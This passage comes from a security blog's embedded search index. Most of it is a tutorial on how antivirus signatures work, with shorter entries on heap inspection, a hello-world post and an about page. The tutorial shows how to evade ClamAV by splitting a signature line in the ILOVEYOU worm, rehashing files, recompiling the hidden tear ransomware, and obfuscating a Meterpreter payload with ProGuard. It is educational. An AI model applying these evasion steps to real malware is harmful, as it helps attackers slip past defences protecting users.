method sets all char array positions as 0\nShould get things done right? Let\u0026rsquo;s check it.\nYou can test a request with curl:\n1  curl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; --data \u0026#39;{\u0026#34;password\u0026#34;: \u0026#34;therealdeal123\u0026#34;}\u0026#39; http://localhost:8080/SpringMVC/index   Open the dump in VisualVM and search for the array:\n1  selectsfrom\\[Cswheres.toString().contains(\u0026#34;therealdeal123\u0026#34;)  And the output:\n\nAs you can see there\u0026rsquo;s still heap inspection\u0026hellip; Maybe I didn\u0026rsquo;t clean it right?\n1  selectsfrom\\[Cswheres.toString()==\u0026#34;00000000000000\u0026#34;  \nLooks like I did\u0026hellip;\nSo how can we clean that extra string? As far as I know, you can\u0026rsquo;t \u0026hellip;\nReally? All of this to tell that we can\u0026rsquo;t?\nYes :)\nYou need to wait until these internal variables get overwritten in memory.\nIs this only happening because of Spring?\nNo. This also happens with normal servlets for example. If you have a parameter in the request you are already done, because parameters are always strings. You can open a reader for the body, parse the body with an array buffer, do what you need to do, close the reader and clean the buffer. You solved the problem from your side, you still have other variables from the GlassfishServer or from the Servlets.\nHave in mind that even if you could just clean all the variables, if an attacker does a dump of the process in the exact moment you receive a password into a char array it will be able anyway to see it. So at the end, the best approach is to have passwords in clear text in memory as less time as possible since there is no way to completely solve this problem.\nLong story short Heap inspection is really difficult to prevent, and most of times is impossible.\nYou can reduce the risk of exposure, by keeping sensitive data in memory as less time as possible and make sure you clear the content, by using char arrays instead of strings and clear them after usage.\nIf dealing with passwords, you can receive them already hashed from client side, and hash them again before going to the database.\nKeep sensitive information encrypted in memory, as an extra layer of security.\n", 
        "url": "https:\/\/thesecurityvault.com\/heap-inspection\/",
        "summary": "Heap Inspection is a vulnerability that most of the times developers don\u0026rsquo;t care about, since it is not easy to mitigate, and most of libraries\/frameworks are not prepared to handle it.\nSo what is Heap Inspection? Basically it\u0026rsquo;s just when you get access to a machine and get access to …",
        "preview": "https:\/\/thesecurityvault.com\/heap-inspection\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/how-antivirus-works-and-bypass-techniques-part-1\/": {
        
        "title": "How Antivirus works and bypass techniques - part 1",
        "tags": [],
        "content": "This time i\u0026rsquo;m not going to talk about a specific vulnerability. Instead I\u0026rsquo;m going to show how attackers disguise malware in order to bypass antivirus.\nAntivirus 101 To start, we need to understand how AV works.\nI\u0026rsquo;m just going to touch on the basics, but they should be enough to understand the logic behind all of this.\nTo know that a malware is actually a malware the AV checks an internal database where it stores what is called a signature. This signature is a peace of the malware, that should be unique to that program. In a lot of scenarios these signatures are strings or checksum hashes from the binaries.\nLets see an example.\nSomeone writes ransomware that encrypts all the disk and at the end writes a file to the desktop with the content: \u0026ldquo;Haha you are now a victim of TheGreatAndAwesomeRansonwareTheBestInTheWorld pay or loose everything\u0026rdquo;. Nice file hum?\nSo an AV vendor may choose to add the print of this string as the virus signature. So if it finds it on a file, it will say that file is the TheGreatAndAwesomeRansonwareTheBestInTheWorld ransonware.\nThe biggest disadvantage of this approach is that AV vendors need to know the malware, to flag it in the AV.\nThis is why they usually use what is called HoneyPots. A HoneyPot is a fake vulnerable public machine that is expected to be exploited. From the exploit the AV vendor can find new malware, and new techniques, then just need to add them to the AV.\nNowadays a lot of attackers also use HoneyPots, to mess with other attackers, to find themselves new malware, to learn new stuff, etc.\nClamAV To reallyunderstand how an antivirus operates we need to see one working\nI\u0026rsquo;m going to use ClamAV to do demos since it is a free and opensource antivirus, and its awesome for testing this kind of stuff.\nIn a bash terminal (debian based), you can install it like:\n1 2  sudo apt-get install clamav sudo freshclam #to update (first get gets all virus info)   There is also a daemon to run it, but since we don\u0026rsquo;t need it for tests, I\u0026rsquo;m leaving it alone\nTo do a quick test we are going to use the old ILOVEYOU virus.\nActually I dont recall it from my time (probably I was too young to hear about viruses) but I found the code on github, which I\u0026rsquo;m trusting its the right one :)\nI did a fork of it, and you can find it here\nDownload it to your machine like so:\n1 2  cd /tmp wget https://github.com/thesecurityvault/ILOVEYOU/blob/master/LOVE-LETTER-FOR-YOU.TXT.vbs   ClamAV Basics Since we need to understand how AV\u0026rsquo;s work I\u0026rsquo;m going to spend some time explaining ClamAV. Its opensource, there\u0026rsquo;s (good) public documentation, and its really nice to see it working :)\nWe need to get to the ClamAV databases so, lets see where they are.\nUsually there\u0026rsquo;s a file /etc/clamav/freshclam.conf that can tells us that. Cat it:\n1  cat /etc/clamav/freshclam.conf   \nYou will get something like the image above. And the property \u0026ldquo;DatabaseDirectory\u0026rdquo; tells you where the db\u0026rsquo;s are.\nYou are going to find some files like:\n bytecode.cvd daily.cvd main.cvd mirrors.cvd  For now lets focus on main.cvd and daily.cvd\nFor us to be able to read the info from these files we need to extract them with a tool provided by ClamAV called sigtool like so:\n1 2  sigtool -u /var/lib/clamav/main.cvd sigtool -u /var/lib/clamav/daily.cvd   You now have a lot of files with different extensions:\nI will cover some of them through this article, but if you want to get more information about it check official docs here.\nAll set, lets test the ILOVEYOU against ClamAV:\nclamscan LOVE-LETTER-FOR-YOU.TXT.vbs\nWe get the following results:\n\nClamAV Signatures Ok, so ClamAV identified ILOVEYOU worm, but how?\nLets see which signatures identified the virus\nWe can do it with sigtool as well, with the following command:\n1  sigtool --find-sigs Win.Worm.LoveLetter-16   Where \u0026ldquo;Win.Worm.LoveLetter-16\u0026rdquo; is the identifier ClamAV gave us for ILOVEYOU\n\nRight at the beginning we can see that the signature is stored in main.ndb but unfortunately the signature is in hex, which is not that pretty to look at.\nThis is how AV\u0026rsquo;s process files. They don\u0026rsquo;t care about being human readable, in fact, they cannot be worried with that. If they are looking for a specific pattern in a binary file, they cannot translate it\u0026hellip; That is why everything is in hex internally. An AV opens a file in hex, and compares their hex signatures.\nAnyway, lets \u0026ldquo;pretty print\u0026rdquo; it:\n1  sigtool --find-sigs Win.Worm.LoveLetter-16 | sigtool --decode-sigs   \nMuch better now.\nThe interesting part is the \u0026ldquo;DECODED SIGNATURE\u0026rdquo; section\nThis is the actual human readable ClamAV signature for the ILOVEYOU worm. In other words this is how ClamAV identifies the malicious file.\nIf you look at the code you will find this snippet in line 329.\nBypassing ClamAV signature So if the AV uses this line to identify ILOVEYOU what about if we change it?\nReplace that line (329) by the following two lines:\n1 2  \u0026amp; vbcrlf \u0026amp; _ \u0026#34;If (window.screen)\u0026#34; \u0026amp; vbcrlf \u0026amp; _ \u0026#34;{var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}\u0026#34;   The only thing done here, was separating the line in two separated lines, keeping the same behavior. Run it again through the anti virus:\n\nWe bypassed ClamAV but this does not necessarily mean that we bypassed any other AV. Each vendor has its own signatures, their own way of identifying malware.\nVirusTotal is a website that runs the supplied file through around 50 different AV products and shows their results. We can test ILOVEYOU there to see the results\nThis is the result for ILOVEYOU worm:\n\nVirusTotal Scan\n38 out of 55 AV solutions found ILOVEYOU\nIf we now upload the changed version lets see what happens:\n\nVirusTotal Scan\nHere we have it. 38 out of 57. Signatures are different on other AV\u0026rsquo;s and that\u0026rsquo;s why we could only bypass ClamAV.\nClamAV \u0026amp; Eicar Lets test a different scenario. For this we are going to use the EICAR test file. This is nothing more then a text file defined as a standard for testing AV\u0026rsquo;s. This means that every compliant AV vendor added signatures for this file in their AV\u0026rsquo;s even not being malicious. Again, is a way of testing if the AV is working properly.\nLets download the file from its original source and scan it:\n1 2 3  wget https://secure.eicar.org/eicar_com.zip unzip eicar_com.zip clamscan eicar.com   \nTo get the signatures associated with this file (to be recognized) run sigtool again:\n1  sigtool --find-sigs Eicar-Test-Signature   \nAs you can see there are a lot of signatures in all ClamAV files. I\u0026rsquo;m just going to explain two of them, since the logic is similar to all.\nThe first one is in daily.hdb and this file has the md5 hashes of the files. What this means is that ClamAV did an md5 checksum of the file, and found the same hash.\nWe can make sure thats the case by using one of the following commands:\n1 2  sigtool --md5 eicar.com md5sum eicar.com   They both, return the same hash: 44d88612fea8a8f36de82e1278abb02f\nNow we have a different scenario from the first time. With ILOVEYOU the AV was looking for a specific file content while with eicar its looking for the signature of the file.\nThis means that if we change the file content, the checksum will be different, and so ClamAV wiill not find it.\nOpen eicar.com and change it\u0026rsquo;ts content. I just added an \u0026lsquo;a\u0026rsquo; at the begining. Then do the checksum again:\n1 2  sigtool --md5 eicar.com md5sum eicar.com   And we have a new hash: 0ce164bf3975aa4b75bb5a5a15b73cbe\nRunning a new scan, its not flagged anymore:\n\nWhy signatures are bad Using file hash as a signature may be quite effective if you don\u0026rsquo;t have access to the code to manipulate it.\nIf its like a c# application that you can easily reverse and rebuild that\u0026rsquo;s not that great. Or if you have the source code of a known malware that you can just change.\nAnd that is exactly what happened to me at this point of writing.\nI went to github, download the hidden tear ransomware, which is a nice open source project (with deliberated programming flaws, so it won\u0026rsquo;t be that dangerous since its purpose is educational).\nI wanted to show on a real and nice example how to change a malware source code to bypass antivirus\nSo I downloaded the code and compiled it with Visual Studio. For my surprise ClamAV is using an Hash based Signature for hidden tear. Which means that it only stores the hash of the compiled binary. So when I compiled it and scan it it didn\u0026rsquo;t find anything. The source code is the same, no changes, but if, for example, the .net framework version is different from the one used to create the signature the output executable will also be different. I had to do nothing to bypass this detection, good :)\nSo I downloaded the code and compiled it with Visual Studio. For my surprise ClamAV is using an Hash based Signature for hidden tear. Which means that it only stores the hash of the compiled binary. So when I compiled it and scan it it didn\u0026rsquo;t find anything. The source code is the same, no changes, but if, for example, the .net framework version is different from the one used to create the signature the output executable will also be different. I had to do nothing to bypass antivirus this time, good (or not):)\nLets try to test this with another real and nice scenario then.\nBypassing Meterpreter signature (if you don\u0026rsquo;t know what is metasploit and meterpreter you don\u0026rsquo;t know what you are missing)\nLets download meterpreter java payload and compile it. You can find the source code on github:\n1 2 3 4  git clone https://github.com/rapid7/metasploit-payloads/ cd metasploit-payloads/java mvn compile mvn package   Note: This payloads still use JDK 1.5, which was not supported with my current java version, so I had to replace all occurrences of 1.5 to 1.6 at least :)\nK, now we have our meterpreter payload at metasploit-payloads/java/javapayload/target\nTo make sure it gets caught by ClamAV lets start scan it:\n1  clamscan javapayload/target/Metasploit-JavaPayload-1-SNAPSHOT.jar   Great, still vulnerable.\nNow, how to bypass antivirus here?\nJust for context lets see what clamAV uses to flag this payload:\n1  sigtool --find-sigs Win.Tool.MeterPreter-6294292-0 | sigtool --decode-sigs   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  VIRUS NAME: Win.Tool.MeterPreter-6294292-0 TDB: Engine:51-255,Target:1 LOGICAL EXPRESSION: 0\u0026amp;1\u0026amp;2\u0026amp;3\u0026amp;4\u0026amp;5\u0026amp;6\u0026amp;7\u0026amp;8 * SUBSIG ID 0 +-\u0026gt; OFFSET: ANY +-\u0026gt; SIGMOD: NONE +-\u0026gt; DECODED SUBSIGNATURE: metsrv.dll * SUBSIG ID 1 +-\u0026gt; OFFSET: ANY +-\u0026gt; SIGMOD: NONE +-\u0026gt; DECODED SUBSIGNATURE: core_update_thread_token * SUBSIG ID 2 +-\u0026gt; OFFSET: ANY +-\u0026gt; SIGMOD: NONE +-\u0026gt; DECODED SUBSIGNATURE: core_update_desktop * SUBSIG ID 3 +-\u0026gt; OFFSET: ANY +-\u0026gt; SIGMOD: NONE +-\u0026gt; DECODED SUBSIGNATURE: packet_create * SUBSIG ID 4 +-\u0026gt; OFFSET: ANY +-\u0026gt; SIGMOD: NONE +-\u0026gt; DECODED SUBSIGNATURE: scheduler_initialize * SUBSIG ID 5 +-\u0026gt; OFFSET: ANY +-\u0026gt; SIGMOD: NONE +-\u0026gt; DECODED SUBSIGNATURE: scheduler_insert_waitable * SUBSIG ID 6 +-\u0026gt; OFFSET: ANY +-\u0026gt; SIGMOD: NONE +-\u0026gt; DECODED SUBSIGNATURE: channel_create_stream * SUBSIG ID 7 +-\u0026gt; OFFSET: ANY +-\u0026gt; SIGMOD: NONE +-\u0026gt; DECODED SUBSIGNATURE: channel_write_to_remote * SUBSIG ID 8 +-\u0026gt; OFFSET: ANY +-\u0026gt; SIGMOD: NONE +-\u0026gt; DECODED SUBSIGNATURE: buffer_from_file   Its looking for specific keywords like metsrv.dll and scheduler_initialize. This look like method or variable names or strings\u0026hellip; So we can just refactor variables/methods, and change strings (most of the time, splitting them into two strings works, or you can change specific chars and then do a replace no make it right again).\nTbh I\u0026rsquo;m too lazy to be manually changing all of this, so I downloaded ProGuard which is a Java obfuscator and does basically what we need. Refactor methods, variables and can even obfuscate strings.\nI\u0026rsquo;m not going into details on how to handle proguard.\nI just ran everything with default settings, and exported my new meterpreter payload to obfuscated.jar. Lets run a new scan:\n\nNo findings\u0026hellip; Great, we just bypassed AV with a real thread.\nBut don\u0026rsquo;t get crazy yet\u0026hellip;\nOther AV\u0026rsquo;s still catch it. Check the VirusTotal report:\n\nA lot of times, evading AV\u0026rsquo;s is just about evading the AV the victim is using, don\u0026rsquo;t need to evade all.\nIn this case since we do not know the signatures used by the other AV\u0026rsquo;s we would need to keep refactor code until it gets completely undetected:\nSeparate instructions into multiple statements, add random method calls between complex logic, obfuscate strings, change variables, method names, etc.\nThis is it for the first article. I covered a lot of stuff already.\nI\u0026rsquo;ll be writing another post with more complex AV logic like the sandbox and some bypass techniques\n", 
        "url": "https:\/\/thesecurityvault.com\/how-antivirus-works-and-bypass-techniques-part-1\/",
        "summary": "This time i\u0026rsquo;m not going to talk about a specific vulnerability. Instead I\u0026rsquo;m going to show how attackers disguise malware in order to bypass antivirus.\nAntivirus 101 To start, we need to understand how AV works.\nI\u0026rsquo;m just going to touch on the basics, but they should be enough to …",
        "preview": "https:\/\/thesecurityvault.com\/how-antivirus-works-and-bypass-techniques-part-1\//images\/banner.jpeg"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/hello-world\/": {
        
        "title": "Hello world!",
        "tags": [],
        "content": "\u0026ldquo;What hath God wrought?\u0026rdquo;\n\u0026ldquo;Mr. Watson\u0026ndash;come here\u0026ndash;I want to see you.\u0026rdquo;\n\u0026ldquo;Tere, kas sa kuuled mind?\u0026rdquo;\n\u0026ldquo;QWERTYUIOP\u0026rdquo;\n\u0026ldquo;just setting up my twttr\u0026rdquo;\n\u0026ldquo;Merry Christmas.\u0026rdquo;\n\u0026ldquo;Houston\u0026rdquo;\n\u0026ldquo;Glory to God in the highest and on earth peace to men of good will.\u0026rdquo;\n\u0026ldquo;Wait a minute, wait a minute, I tell yer, you ain\u0026rsquo;t heard nothin\u0026rdquo;\nThese are all probably just best sentences to start the first blog post then the ones I imagined so I\u0026rsquo;m leaving them all here\nThere\u0026rsquo;s not much to say\u0026hellip; TheSecurityVault is finally alive, and I hope you all enjoy its contents :D\n", 
        "url": "https:\/\/thesecurityvault.com\/hello-world\/",
        "summary": "\u0026ldquo;What hath God wrought?\u0026rdquo;\n\u0026ldquo;Mr. Watson\u0026ndash;come here\u0026ndash;I want to see you.\u0026rdquo;\n\u0026ldquo;Tere, kas sa kuuled mind?\u0026rdquo;\n\u0026ldquo;QWERTYUIOP\u0026rdquo;\n\u0026ldquo;just setting up my twttr\u0026rdquo;\n\u0026ldquo;Merry Christmas.\u0026rdquo;\n\u0026ldquo;Houston\u0026rdquo;\n\u0026ldquo;Glory to God in the highest and …",
        "preview": "https:\/\/thesecurityvault.com\/hello-world\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/about\/": {
        
        "title": "About me",
        "tags": [],
        "content": "About TheSecurityVault\nOn a regular basis I\u0026rsquo;m confronted with a lot of AppSec vulnerabilities which are quite unknown and good documentation about it is scarce.\nTo show what a vulnerability is, how it happens or how to fix it is sometimes hard due to the this lack of articles.\nI decided to create TheSecurityVault to share my knowledge about these not well known vulnerabilities, a place where you can find the answers that you need, from when/how the vulnerability happens, how to exploit it and how to fix it, from start to finish, in a single place. This is a website for the common developer to understand what can go wrong about subjects that due to their \u0026lsquo;low\u0026rsquo; or neglected impact are not taken in consideration or are not written much about. Hope you like it :D\n", 
        "url": "https:\/\/thesecurityvault.com\/about\/",
        "summary": "About TheSecurityVault\nOn a regular basis I\u0026rsquo;m confronted with a lot of AppSec vulnerabilities which are quite unknown and good documentation about it is scarce.\nTo show what a vulnerability is, how it happens or how to fix it is sometimes hard due to the this lack of articles.\nI decided to …",
        "preview": "https:\/\/thesecurityvault.com\/about\//"
    },
    
}

</script>

<footer class="text-center footer">

  <div class="container footer-content">
    <div class="row">

      <div class="col-md-6 text-left">
        <div><img src="https://thesecurityvault.com/img/logo.png"></div>
      </div>

      <div class="col-md-6 text-right">
        <div>
          <a href="/sitemap.xml">Sitemap</a>
        </div>
        <div>
          Copyright 2019-2024 The Security Vault. All rights reserved.
        </div>
      </div>
    </div>

</footer>


<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"
  integrity="sha384-ZvpUoO/+PpLXR1lu4jmpXWu80pZlYUAfxl5NsBMWOEPSjUn/6Z/hRTt8+pR6L4N2" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"
  integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF" crossorigin="anonymous"></script>
<script src="https://kit.fontawesome.com/ab4860f980.js"
  integrity="sha384-AbZOA7GYMJh1wZbW0vLI9LLjXjJcIago4vs45qRTQmAlaelCTcLcXNn1dpEmI2Jo" crossorigin="anonymous"></script>

<script src="https://unpkg.com/lunr@2.3.9/lunr.js"
  integrity="sha384-Mrc0XsDxndfJgV5jLnEeThch4j9dNEXAE1vbWeyzmERxSvF8siQfuEczzgUelQQH" crossorigin="anonymous"></script>

<script src="/js/search.js"></script>

<script>

  
  const links = document.getElementsByTagName("a")
  for (let i = 0; i < links.length; i++) {
    const link = links[i]
    link.addEventListener("click", (evt) => {
      const a = evt.currentTarget
      const isImage = a.href.endsWith(".jpg") || a.href.endsWith(".png") || a.href.endsWith(".jpeg") || a.href.endsWith(".gif")
      const external = a.href.startsWith("http" && !a.href.startsWith(window.location.origin))

      if (isImage || external) {
        evt.currentTarget.target = "_blank"
        evt.currentTarget.rel = "noopener noreferrer"
      }
    })
  }

  
  const headers = document.querySelectorAll(".single-post-content > h2,.single-post-content > h3,.single-post-content > h4,.single-post-content > h5,.single-post-content > h6")
  const icon = document.createElement("i")
  icon.className = "fas fa-link"
  icon.textContent = " "
  icon.style.marginLeft = "5px"
  icon.style.fontSize = "20px"

  for (let i = 0; i < headers.length; i++) {
    const h = headers[i]
    h.insertAdjacentElement("beforeend", icon.cloneNode())
    h.onclick = () => window.location.hash = h.id

  }

</script></body>

</html>